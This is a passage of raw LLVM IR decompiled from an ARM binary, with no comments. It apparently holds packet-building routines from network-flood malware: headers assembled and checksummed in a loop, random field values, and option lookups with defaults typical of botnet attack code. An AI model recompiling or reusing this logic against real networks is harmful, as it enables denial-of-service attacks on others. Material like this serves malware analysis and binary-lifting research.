  %v2_c6e4 = icmp eq i32 %v0_c6e4, 0
  store i1 %v2_c6e4, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r1.global-to-local, align 4
  %tmp90 = icmp slt i32 %v0_c6e4, 1
  br label %dec_label_pc_c6ec

dec_label_pc_c6ec:                                ; preds = %dec_label_pc_c6ec, %dec_label_pc_c6e4
  br i1 %tmp90, label %dec_label_pc_c6ec, label %dec_label_pc_c6f0

dec_label_pc_c6f0:                                ; preds = %dec_label_pc_c6ec
  %v0_c6f0 = load i32, i32* @r8, align 4
  %v3_c6f0 = mul i32 %v0_c6f0, 65536
  store i32 %v3_c6f0, i32* %r2.global-to-local, align 4
  %tmp91 = mul i32 %v0_c6f0, 256
  %v1_c6f8 = and i32 %tmp91, 65280
  store i32 %v1_c6f8, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-40, align 4
  %tmp92 = udiv i32 %v0_c6f0, 256
  %v4_c704 = urem i32 %tmp92, 256
  %v5_c704 = or i32 %v4_c704, %v1_c6f8
  store i32 %v5_c704, i32* @sl, align 4
  store i32 0, i32* @r7, align 4
  br label %dec_label_pc_c70c

dec_label_pc_c70c:                                ; preds = %dec_label_pc_c78c, %dec_label_pc_c6f0
  %v1_c720 = phi i32 [ %v1_c81c, %dec_label_pc_c78c ], [ 0, %dec_label_pc_c6f0 ]
  %v5_c710 = mul i32 %v1_c720, 24
  %v1_c714 = load i32, i32* @sb, align 4
  %v2_c714 = add i32 %v1_c714, %v5_c710
  store i32 %v2_c714, i32* %r3.global-to-local, align 4
  store i32 %v2_c218, i32* %ip.global-to-local, align 4
  %v1_c71c = add i32 %v2_c714, 20
  %v2_c71c = inttoptr i32 %v1_c71c to i8*
  %v3_c71c = load i8, i8* %v2_c71c, align 1
  %v4_c71c = zext i8 %v3_c71c to i32
  store i32 %v4_c71c, i32* %r2.global-to-local, align 4
  %v4_c720 = mul i32 %v1_c720, 4
  %v5_c720 = add i32 %v4_c720, %v2_c218
  %v6_c720 = inttoptr i32 %v5_c720 to i32*
  %v7_c720 = load i32, i32* %v6_c720, align 4
  store i32 %v7_c720, i32* @r5, align 4
  %v7_c724 = icmp eq i8 %v3_c71c, 31
  store i1 %v7_c724, i1* %cpsr_z.global-to-local, align 1
  %v1_c728 = add i32 %v7_c720, 20
  store i32 %v1_c728, i32* @r6, align 4
  %tmp100 = icmp ult i8 %v3_c71c, 32
  br i1 %tmp100, label %dec_label_pc_c840, label %dec_label_pc_c730

dec_label_pc_c730:                                ; preds = %dec_label_pc_c70c
  store i32 %v6_c3e8, i32* %r1.global-to-local, align 4
  store i1 %v8_c89c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_c89c, label %dec_label_pc_c8a8, label %dec_label_pc_c73c

dec_label_pc_c73c:                                ; preds = %dec_label_pc_c840, %dec_label_pc_c730
  store i32 %v3_c444, i32* %r2.global-to-local, align 4
  store i32 65535, i32* @r4, align 4
  store i1 %v3_c8b8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_c8b8, label %dec_label_pc_c8c4, label %dec_label_pc_c750

dec_label_pc_c750:                                ; preds = %dec_label_pc_c8a8.dec_label_pc_c750_crit_edge, %dec_label_pc_c73c
  %v1_c754 = phi i32 [ %v1_c754.pre, %dec_label_pc_c8a8.dec_label_pc_c750_crit_edge ], [ 65535, %dec_label_pc_c73c ]
  store i32 %v3_c448, i32* %r3.global-to-local, align 4
  %v9_c754 = icmp eq i32 %v3_c448, %v1_c754
  store i1 %v9_c754, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c754, label %dec_label_pc_c8e0, label %dec_label_pc_c75c

dec_label_pc_c75c:                                ; preds = %dec_label_pc_c8c4.dec_label_pc_c75c_crit_edge, %dec_label_pc_c750
  %v1_c760 = phi i32 [ %v1_c760.pre, %dec_label_pc_c8c4.dec_label_pc_c75c_crit_edge ], [ %v1_c754, %dec_label_pc_c750 ]
  store i32 %v3_c44c, i32* %ip.global-to-local, align 4
  %v9_c760 = icmp eq i32 %v3_c44c, %v1_c760
  store i1 %v9_c760, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c760, label %dec_label_pc_c8fc, label %dec_label_pc_c768

dec_label_pc_c768:                                ; preds = %dec_label_pc_c8e0.dec_label_pc_c768_crit_edge, %dec_label_pc_c75c
  %v1_c76c = phi i32 [ %v1_c76c.pre, %dec_label_pc_c8e0.dec_label_pc_c768_crit_edge ], [ %v1_c760, %dec_label_pc_c75c ]
  store i32 %v5_c2e8, i32* %r1.global-to-local, align 4
  %v9_c76c = icmp eq i32 %v5_c2e8, %v1_c76c
  store i1 %v9_c76c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c76c, label %dec_label_pc_c918, label %dec_label_pc_c774

dec_label_pc_c774:                                ; preds = %dec_label_pc_c8fc.dec_label_pc_c774_crit_edge, %dec_label_pc_c768
  %v1_c778 = phi i32 [ %v1_c778.pre, %dec_label_pc_c8fc.dec_label_pc_c774_crit_edge ], [ %v1_c76c, %dec_label_pc_c768 ]
  store i32 %v6_c304, i32* %r2.global-to-local, align 4
  %v9_c778 = icmp eq i32 %v6_c304, %v1_c778
  store i1 %v9_c778, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c778, label %dec_label_pc_c92c, label %dec_label_pc_c780

dec_label_pc_c780:                                ; preds = %dec_label_pc_c918, %dec_label_pc_c774
  store i32 %v1_c3d4, i32* %r3.global-to-local, align 4
  store i1 %v2_c934, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_c934, label %dec_label_pc_c78c, label %dec_label_pc_c940

dec_label_pc_c78c:                                ; preds = %dec_label_pc_c780, %dec_label_pc_c92c, %dec_label_pc_c940
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_c790 = load i32, i32* @r7, align 4
  %v1_c790 = trunc i32 %v0_c790 to i8
  %v2_c790 = load i32, i32* @r5, align 4
  %v3_c790 = add i32 %v2_c790, 10
  %v4_c790 = inttoptr i32 %v3_c790 to i8*
  store i8 %v1_c790, i8* %v4_c790, align 1
  %v0_c794 = load i32, i32* @r7, align 4
  %v1_c794 = trunc i32 %v0_c794 to i8
  %v2_c794 = load i32, i32* @r5, align 4
  %v3_c794 = add i32 %v2_c794, 11
  %v4_c794 = inttoptr i32 %v3_c794 to i8*
  store i8 %v1_c794, i8* %v4_c794, align 1
  %v0_c798 = load i32, i32* @r5, align 4
  store i32 %v0_c798, i32* @r0, align 4
  %v2_c79c = call i32 @function_d0b8(i32 %v0_c798, i32 20)
  %v3_c79c = trunc i32 %v2_c79c to i8
  %v4_c7a028 = udiv i32 %v2_c79c, 256
  %v1_c7a4 = trunc i32 %v4_c7a028 to i8
  %v2_c7a4 = load i32, i32* @r5, align 4
  %v3_c7a4 = add i32 %v2_c7a4, 11
  %v4_c7a4 = inttoptr i32 %v3_c7a4 to i8*
  store i8 %v1_c7a4, i8* %v4_c7a4, align 1
  %v3_c7a8 = load i32, i32* @r5, align 4
  %v4_c7a8 = add i32 %v3_c7a8, 10
  %v5_c7a8 = inttoptr i32 %v4_c7a8 to i8*
  store i8 %v3_c79c, i8* %v5_c7a8, align 1
  %v0_c7ac = load i32, i32* @r6, align 4
  store i32 %v0_c7ac, i32* @r1, align 4
  %v0_c7b0 = load i32, i32* @sl, align 4
  store i32 %v0_c7b0, i32* %r2.global-to-local, align 4
  %v0_c7b4 = load i32, i32* @r8, align 4
  store i32 %v0_c7b4, i32* %r3.global-to-local, align 4
  %v0_c7b8 = load i32, i32* @r7, align 4
  %v1_c7b8 = trunc i32 %v0_c7b8 to i8
  %v3_c7b8 = add i32 %v0_c7ac, 16
  %v4_c7b8 = inttoptr i32 %v3_c7b8 to i8*
  store i8 %v1_c7b8, i8* %v4_c7b8, align 1
  %v0_c7bc = load i32, i32* @r7, align 4
  %v1_c7bc = trunc i32 %v0_c7bc to i8
  %v2_c7bc = load i32, i32* @r6, align 4
  %v3_c7bc = add i32 %v2_c7bc, 17
  %v4_c7bc = inttoptr i32 %v3_c7bc to i8*
  store i8 %v1_c7bc, i8* %v4_c7bc, align 1
  %v0_c7c0 = load i32, i32* @r5, align 4
  %v4_c7c4 = call i32 @function_d114(i32 %v0_c7c0, i32 %v0_c7ac, i32 %v0_c7b0, i32 %v0_c7b4)
  %v5_c7c4 = trunc i32 %v4_c7c4 to i8
  %v4_c7c829 = udiv i32 %v4_c7c4, 256
  %v1_c7cc = trunc i32 %v4_c7c829 to i8
  %v2_c7cc = load i32, i32* @r6, align 4
  %v3_c7cc = add i32 %v2_c7cc, 17
  %v4_c7cc = inttoptr i32 %v3_c7cc to i8*
  store i8 %v1_c7cc, i8* %v4_c7cc, align 1
  %v3_c7d0 = load i32, i32* @r6, align 4
  %v4_c7d0 = add i32 %v3_c7d0, 16
  %v5_c7d0 = inttoptr i32 %v4_c7d0 to i8*
  store i8 %v5_c7c4, i8* %v5_c7d0, align 1
  %v3_c7d4 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_c7d4, i32* %r3.global-to-local, align 4
  %v0_c7d8 = load i32, i32* @r5, align 4
  %v1_c7d8 = add i32 %v0_c7d8, 20
  %v2_c7d8 = inttoptr i32 %v1_c7d8 to i32*
  %v3_c7d8 = load i32, i32* %v2_c7d8, align 4
  %v3_c7e0 = udiv i32 %v3_c7d8, 65536
  store i32 %v3_c7e0, i32* %r2.global-to-local, align 4
  %v5_c7e4 = mul i32 %v3_c7d4, 24
  %v1_c7e8 = load i32, i32* @sb, align 4
  %v2_c7e8 = add i32 %v1_c7e8, %v5_c7e4
  store i32 %v2_c7e8, i32* %ip.global-to-local, align 4
  %v3_c7ec27 = udiv i32 %v3_c7d8, 16777216
  %v1_c7f0 = trunc i32 %v3_c7ec27 to i8
  %v3_c7f0 = add i32 %v2_c7e8, 3
  %v4_c7f0 = inttoptr i32 %v3_c7f0 to i8*
  store i8 %v1_c7f0, i8* %v4_c7f0, align 1
  %v0_c7f4 = load i32, i32* %r2.global-to-local, align 4
  %v1_c7f4 = trunc i32 %v0_c7f4 to i8
  %v2_c7f4 = load i32, i32* %ip.global-to-local, align 4
  %v3_c7f4 = add i32 %v2_c7f4, 2
  %v4_c7f4 = inttoptr i32 %v3_c7f4 to i8*
  store i8 %v1_c7f4, i8* %v4_c7f4, align 1
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_c7fc = load i32, i32* @r5, align 4
  store i32 %v0_c7fc, i32* %r1.global-to-local, align 4
  store i32 %stack_var_-168.0.ph, i32* %r2.global-to-local, align 4
  store i32 16, i32* @r4, align 4
  %v0_c80c = load i32, i32* %ip.global-to-local, align 4
  %v6_c814 = inttoptr i32 %v0_c7fc to i32*
  %v7_c814 = call i32 @function_1237c(i32 %v3_c3fc, i32* %v6_c814, i32 %stack_var_-168.0.ph, i32 16384, i32 %v0_c80c, i32 16)
  %v3_c818 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_c818, i32* %r3.global-to-local, align 4
  %v1_c81c = add i32 %v3_c818, 1
  %v0_c820 = load i32, i32* @fp, align 4
  %v9_c820 = icmp eq i32 %v0_c820, %v1_c81c
  store i1 %v9_c820, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_c81c, i32* %stack_var_-40, align 4
  %v7_c828 = icmp sgt i32 %v0_c820, %v1_c81c
  br i1 %v7_c828, label %dec_label_pc_c70c, label %dec_label_pc_c6e4

dec_label_pc_c830:                                ; preds = %dec_label_pc_c40c
  %v1_c834 = call i32 @function_11af0(i32 %v3_c3fc)
  br label %dec_label_pc_c838

dec_label_pc_c838:                                ; preds = %dec_label_pc_c1f8, %dec_label_pc_c830
  %v29_c83c = phi i32 [ %v3_c3fc, %dec_label_pc_c1f8 ], [ %v1_c834, %dec_label_pc_c830 ]
  ret i32 %v29_c83c

dec_label_pc_c840:                                ; preds = %dec_label_pc_c70c
  %v1_c840 = add i32 %v2_c714, 16
  %v2_c840 = inttoptr i32 %v1_c840 to i32*
  %v3_c840 = load i32, i32* %v2_c840, align 4
  %v0_c844 = call i32 @function_e978()
  %v3_c848 = load i32, i32* %stack_var_-40, align 4
  %v5_c850 = mul i32 %v3_c848, 24
  %v1_c858 = load i32, i32* @sb, align 4
  %v2_c858 = add i32 %v1_c858, %v5_c850
  store i32 %v2_c858, i32* %r1.global-to-local, align 4
  %v1_c85c = and i32 %v3_c840, 65280
  store i32 %v1_c85c, i32* %r3.global-to-local, align 4
  %v1_c854 = udiv i32 %v3_c840, 256
  %v3_c860 = and i32 %v1_c854, 65280
  store i32 %v3_c860, i32* %r2.global-to-local, align 4
  %v3_c864 = mul i32 %v3_c840, 16777216
  store i32 %v3_c864, i32* %ip.global-to-local, align 4
  %v1_c868 = add i32 %v2_c858, 20
  %v2_c868 = inttoptr i32 %v1_c868 to i8*
  %v3_c868 = load i8, i8* %v2_c868, align 1
  %v4_c868 = zext i8 %v3_c868 to i32
  %v4_c86c = mul nuw nsw i32 %v1_c85c, 256
  %v5_c86c = or i32 %v4_c86c, %v3_c864
  store i32 %v5_c86c, i32* %ip.global-to-local, align 4
  %v2_c874 = call i32 @llvm.bswap.i32(i32 %v3_c840)
  %v7_c878 = lshr i32 %v0_c844, %v4_c868
  %v8_c878 = add i32 %v7_c878, %v2_c874
  store i32 %v8_c878, i32* %r2.global-to-local, align 4
  %v2_c894 = call i32 @llvm.bswap.i32(i32 %v8_c878)
  store i32 %v2_c894, i32* %r3.global-to-local, align 4
  store i32 %v6_c3e8, i32* %r1.global-to-local, align 4
  store i1 %v8_c89c, i1* %cpsr_z.global-to-local, align 1
  %v1_c8a0 = load i32, i32* @r5, align 4
  %v2_c8a0 = add i32 %v1_c8a0, 16
  %v3_c8a0 = inttoptr i32 %v2_c8a0 to i32*
  store i32 %v2_c894, i32* %v3_c8a0, align 4
  br i1 %v3_c89c, label %dec_label_pc_c8a8, label %dec_label_pc_c73c

dec_label_pc_c8a8:                                ; preds = %dec_label_pc_c840, %dec_label_pc_c730
  %v0_c8a8 = call i32 @function_e978()
  store i32 %v3_c444, i32* %r2.global-to-local, align 4
  store i32 65535, i32* @r4, align 4
  store i1 %v3_c8b8, i1* %cpsr_z.global-to-local, align 1
  %v1_c8bc = load i32, i32* @r5, align 4
  %v2_c8bc = add i32 %v1_c8bc, 12
  %v3_c8bc = inttoptr i32 %v2_c8bc to i32*
  store i32 %v0_c8a8, i32* %v3_c8bc, align 4
  br i1 %v3_c8b8, label %dec_label_pc_c8c4, label %dec_label_pc_c8a8.dec_label_pc_c750_crit_edge

dec_label_pc_c8a8.dec_label_pc_c750_crit_edge:    ; preds = %dec_label_pc_c8a8
  %v1_c754.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_c750

dec_label_pc_c8c4:                                ; preds = %dec_label_pc_c8a8, %dec_label_pc_c73c
  %v0_c8c4 = call i32 @function_e978()
  %v1_c8c4 = trunc i32 %v0_c8c4 to i8
  %v4_c8c830 = udiv i32 %v0_c8c4, 256
  %v1_c8cc = trunc i32 %v4_c8c830 to i8
  %v2_c8cc = load i32, i32* @r5, align 4
  %v3_c8cc = add i32 %v2_c8cc, 5
  %v4_c8cc = inttoptr i32 %v3_c8cc to i8*
  store i8 %v1_c8cc, i8* %v4_c8cc, align 1
  store i32 %v3_c448, i32* %r3.global-to-local, align 4
  %v1_c8d4 = load i32, i32* @r4, align 4
  %v9_c8d4 = icmp eq i32 %v3_c448, %v1_c8d4
  store i1 %v9_c8d4, i1* %cpsr_z.global-to-local, align 1
  %v3_c8d8 = load i32, i32* @r5, align 4
  %v4_c8d8 = add i32 %v3_c8d8, 4
  %v5_c8d8 = inttoptr i32 %v4_c8d8 to i8*
  store i8 %v1_c8c4, i8* %v5_c8d8, align 1
  %v0_c8dc = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_c8dc, label %dec_label_pc_c8e0, label %dec_label_pc_c8c4.dec_label_pc_c75c_crit_edge

dec_label_pc_c8c4.dec_label_pc_c75c_crit_edge:    ; preds = %dec_label_pc_c8c4
  %v1_c760.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_c75c

dec_label_pc_c8e0:                                ; preds = %dec_label_pc_c8c4, %dec_label_pc_c750
  %v0_c8e0 = call i32 @function_e978()
  %v1_c8e0 = trunc i32 %v0_c8e0 to i8
  store i32 %v3_c44c, i32* %ip.global-to-local, align 4
  %v4_c8e8 = sdiv i32 %v0_c8e0, 256
  store i32 %v4_c8e8, i32* %r3.global-to-local, align 4
  %v1_c8ec = load i32, i32* @r4, align 4
  %v9_c8ec = icmp eq i32 %v3_c44c, %v1_c8ec
  store i1 %v9_c8ec, i1* %cpsr_z.global-to-local, align 1
  %v3_c8f0 = load i32, i32* @r5, align 4
  %v4_c8f0 = add i32 %v3_c8f0, 20
  %v5_c8f0 = inttoptr i32 %v4_c8f0 to i8*
  store i8 %v1_c8e0, i8* %v5_c8f0, align 1
  %v0_c8f4 = load i32, i32* %r3.global-to-local, align 4
  %v1_c8f4 = trunc i32 %v0_c8f4 to i8
  %v2_c8f4 = load i32, i32* @r6, align 4
  %v3_c8f4 = add i32 %v2_c8f4, 1
  %v4_c8f4 = inttoptr i32 %v3_c8f4 to i8*
  store i8 %v1_c8f4, i8* %v4_c8f4, align 1
  %v0_c8f8 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_c8f8, label %dec_label_pc_c8fc, label %dec_label_pc_c8e0.dec_label_pc_c768_crit_edge

dec_label_pc_c8e0.dec_label_pc_c768_crit_edge:    ; preds = %dec_label_pc_c8e0
  %v1_c76c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_c768

dec_label_pc_c8fc:                                ; preds = %dec_label_pc_c8e0, %dec_label_pc_c75c
  %v0_c8fc = call i32 @function_e978()
  %v1_c8fc = trunc i32 %v0_c8fc to i8
  store i32 %v5_c2e8, i32* %r1.global-to-local, align 4
  %v4_c904 = sdiv i32 %v0_c8fc, 256
  store i32 %v4_c904, i32* %r3.global-to-local, align 4
  %v1_c908 = load i32, i32* @r4, align 4
  %v9_c908 = icmp eq i32 %v5_c2e8, %v1_c908
  store i1 %v9_c908, i1* %cpsr_z.global-to-local, align 1
  %v1_c90c = trunc i32 %v4_c904 to i8
  %v2_c90c = load i32, i32* @r6, align 4
  %v3_c90c = add i32 %v2_c90c, 3
  %v4_c90c = inttoptr i32 %v3_c90c to i8*
  store i8 %v1_c90c, i8* %v4_c90c, align 1
  %v3_c910 = load i32, i32* @r6, align 4
  %v4_c910 = add i32 %v3_c910, 2
  %v5_c910 = inttoptr i32 %v4_c910 to i8*
  store i8 %v1_c8fc, i8* %v5_c910, align 1
  %v0_c914 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_c914, label %dec_label_pc_c918, label %dec_label_pc_c8fc.dec_label_pc_c774_crit_edge

dec_label_pc_c8fc.dec_label_pc_c774_crit_edge:    ; preds = %dec_label_pc_c8fc
  %v1_c778.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_c774

dec_label_pc_c918:                                ; preds = %dec_label_pc_c8fc, %dec_label_pc_c768
  %v0_c918 = call i32 @function_e978()
  store i32 %v6_c304, i32* %r2.global-to-local, align 4
  %v1_c920 = load i32, i32* @r4, align 4
  %v9_c920 = icmp eq i32 %v6_c304, %v1_c920
  store i1 %v9_c920, i1* %cpsr_z.global-to-local, align 1
  %v1_c924 = load i32, i32* @r6, align 4
  %v2_c924 = add i32 %v1_c924, 4
  %v3_c924 = inttoptr i32 %v2_c924 to i32*
  store i32 %v0_c918, i32* %v3_c924, align 4
  br i1 %v9_c920, label %dec_label_pc_c92c, label %dec_label_pc_c780

dec_label_pc_c92c:                                ; preds = %dec_label_pc_c918, %dec_label_pc_c774
  %v0_c92c = call i32 @function_e978()
  store i32 %v1_c3d4, i32* %r3.global-to-local, align 4
  store i1 %v2_c934, i1* %cpsr_z.global-to-local, align 1
  %v1_c938 = load i32, i32* @r6, align 4
  %v2_c938 = add i32 %v1_c938, 8
  %v3_c938 = inttoptr i32 %v2_c938 to i32*
  store i32 %v0_c92c, i32* %v3_c938, align 4
  br i1 %v2_c934, label %dec_label_pc_c78c, label %dec_label_pc_c940

dec_label_pc_c940:                                ; preds = %dec_label_pc_c780, %dec_label_pc_c92c
  %v0_c940 = load i32, i32* @r5, align 4
  %v1_c940 = add i32 %v0_c940, 40
  store i32 %v6_c3ac, i32* @r1, align 4
  %v1_c948 = inttoptr i32 %v1_c940 to i8*
  %v2_c948 = call i32 @function_eaf8(i8* %v1_c948)
  br label %dec_label_pc_c78c

dec_label_pc_c950:                                ; preds = %dec_label_pc_c434
  store i32 %v6_c3ac, i32* %r3.global-to-local, align 4
  %v1_c958 = add i32 %v6_c3ac, 40
  store i32 %v1_c958, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_c6e4.preheader

; uselistorder directives
  uselistorder i32 %v1_c958, { 1, 0 }
  uselistorder i32 %v4_c904, { 1, 0 }
  uselistorder i32 %v2_c894, { 1, 0 }
  uselistorder i32 %v3_c864, { 1, 0 }
  uselistorder i32 %v3_c840, { 1, 3, 2, 0 }
  uselistorder i32 %v0_c820, { 1, 2, 0 }
  uselistorder i32 %v1_c81c, { 2, 0, 3, 1 }
  uselistorder i32 %v0_c7ac, { 1, 0, 2 }
  uselistorder i32 %v0_c6f0, { 2, 0, 1 }
  uselistorder i32 %v0_c6e4, { 1, 0 }
  uselistorder i1 %v2_c934, { 2, 3, 1, 0 }
  uselistorder i1 %v3_c8b8, { 1, 0, 2, 3 }
  uselistorder i32 %v1_c6cc, { 1, 0, 2, 3 }
  uselistorder i8 %v5_c530, { 1, 0 }
  uselistorder i32 %v1_c4f8, { 1, 0 }
  uselistorder i32 %v1_c4f4, { 1, 0 }
  uselistorder i32 %v1_c4f0, { 1, 0 }
  uselistorder i32 %v1_c4cc, { 1, 0 }
  uselistorder i32 %v1_c4c8, { 1, 0 }
  uselistorder i32 %v1_c4c4, { 1, 0 }
  uselistorder i32 %v1_c4b8, { 1, 0 }
  uselistorder i32 %v1_c494, { 1, 0 }
  uselistorder i32 %v1_c484, { 1, 0 }
  uselistorder i32 %v1_c470, { 3, 0, 2, 1 }
  uselistorder i32 %v0_c450, { 1, 0, 2 }
  uselistorder i32 %v3_c444, { 0, 1, 3, 2 }
  uselistorder i32 %v0_c438, { 3, 0, 1, 2 }
  uselistorder i32 %v0_c434, { 0, 2, 1, 3 }
  uselistorder i1 %v7_c42c, { 1, 0 }
  uselistorder i1 %v7_c400, { 1, 0 }
  uselistorder i32 %v3_c3fc, { 1, 3, 4, 2, 0 }
  uselistorder i32 %v6_c3e8, { 4, 3, 0, 5, 1, 2 }
  uselistorder i32 %v1_c3d4, { 2, 1, 3, 4, 0 }
  uselistorder i32 %v6_c3ac, { 5, 4, 3, 0, 1, 2, 6 }
  uselistorder i32 %v6_c304, { 3, 2, 1, 0 }
  uselistorder i32 %v5_c2e8, { 2, 5, 4, 3, 1, 0 }
  uselistorder i32 %v1_c298, { 1, 0 }
  uselistorder i32 %v6_c230, { 1, 0 }
  uselistorder i32 %v2_c218, { 0, 3, 1, 2 }
  uselistorder i32 %v1_c1fc, { 1, 0 }
  uselistorder i32* %stack_var_-40, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 0, 12, 11 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 19, 18, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 30, 29, 31, 32, 33, 34, 35, 36, 37, 38, 40, 39, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 22, 21, 23, 24, 25, 26, 27, 28, 29, 31, 30, 32, 33, 34, 35, 37, 36, 39, 38, 0 }
  uselistorder i32 (i8*)* @function_eaf8, { 0, 1, 6, 7, 2, 3, 4, 5, 8, 9, 10 }
  uselistorder label %dec_label_pc_c940, { 1, 0 }
  uselistorder label %dec_label_pc_c838, { 1, 0 }
  uselistorder label %dec_label_pc_c78c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_c6e4.preheader, { 1, 0 }
  uselistorder label %bb89, { 1, 0 }
  uselistorder label %.thread13, { 1, 0 }
  uselistorder label %bb86, { 1, 0 }
  uselistorder label %bb84, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_c96c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_c96c:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-40 = alloca i32, align 4
  %v3_c96c = load i32, i32* @r4, align 4
  %v12_c96c = load i32, i32* @r7, align 4
  %v1_c970 = urem i32 %arg1, 256
  store i32 %v1_c970, i32* @sl, align 4
  store i32 %arg2, i32* @r8, align 4
  store i32 %v1_c970, i32* %r0.global-to-local, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg4, i32* @r5, align 4
  %v1_c988 = urem i32 %arg3, 256
  store i32 %v1_c988, i32* @r4, align 4
  %v2_c98c = call i32 @function_126cc(i32 %v1_c970, i32 4)
  %v0_c990 = load i32, i32* @r5, align 4
  store i32 %v0_c990, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v2_c98c, i32* %fp.global-to-local, align 4
  %v0_c9a0 = load i32, i32* @r4, align 4
  store i32 %v0_c9a0, i32* %r0.global-to-local, align 4
  %v4_c9a4 = inttoptr i32 %v0_c990 to i32*
  %v5_c9a4 = call i32 @function_85e0(i32 %v0_c9a0, i32* %v4_c9a4, i32 2, i32 0)
  %v1_c9b0 = urem i32 %v5_c9a4, 256
  store i32 %v1_c9b0, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_c9bc = load i32, i32* @r5, align 4
  store i32 %v0_c9bc, i32* %r1.global-to-local, align 4
  %v0_c9c0 = load i32, i32* @r4, align 4
  store i32 %v0_c9c0, i32* %r0.global-to-local, align 4
  %v5_c9c4 = trunc i32 %v5_c9a4 to i8
  %v6_c9c8 = inttoptr i32 %v0_c9bc to i32*
  %v7_c9c8 = call i32 @function_85e0(i32 %v0_c9c0, i32* %v6_c9c8, i32 3, i32 65535)
  %v0_c9cc = load i32, i32* @r5, align 4
  store i32 %v0_c9cc, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v0_c9dc = load i32, i32* @r4, align 4
  store i32 %v0_c9dc, i32* %r0.global-to-local, align 4
  %v5_c9e0 = inttoptr i32 %v0_c9cc to i32*
  %v6_c9e0 = call i32 @function_85e0(i32 %v0_c9dc, i32* %v5_c9e0, i32 4, i32 64)
  %v1_c9e8 = urem i32 %v6_c9e0, 256
  store i32 %v1_c9e8, i32* %ip.global-to-local, align 4
  %v0_c9ec = load i32, i32* @r5, align 4
  store i32 %v0_c9ec, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_c9f8 = load i32, i32* @r4, align 4
  store i32 %v0_c9f8, i32* %r0.global-to-local, align 4
  %v6_ca00 = inttoptr i32 %v0_c9ec to i32*
  %v7_ca00 = call i32 @function_85e0(i32 %v0_c9f8, i32* %v6_ca00, i32 5, i32 1)
  %v1_ca0c = urem i32 %v7_ca00, 256
  store i32 %v1_ca0c, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_ca18 = load i32, i32* @r5, align 4
  store i32 %v0_ca18, i32* %r1.global-to-local, align 4
  %v0_ca1c = load i32, i32* @r4, align 4
  store i32 %v0_ca1c, i32* %r0.global-to-local, align 4
  %v5_ca24 = inttoptr i32 %v0_ca18 to i32*
  %v6_ca24 = call i32 @function_85e0(i32 %v0_ca1c, i32* %v5_ca24, i32 6, i32 65535)
  %v0_ca2c = load i32, i32* @r5, align 4
  store i32 %v0_ca2c, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 %v6_ca24, i32* @r7, align 4
  %v0_ca3c = load i32, i32* @r4, align 4
  store i32 %v0_ca3c, i32* %r0.global-to-local, align 4
  %v4_ca40 = inttoptr i32 %v0_ca2c to i32*
  %v5_ca40 = call i32 @function_85e0(i32 %v0_ca3c, i32* %v4_ca40, i32 7, i32 65535)
  %v0_ca48 = load i32, i32* @r5, align 4
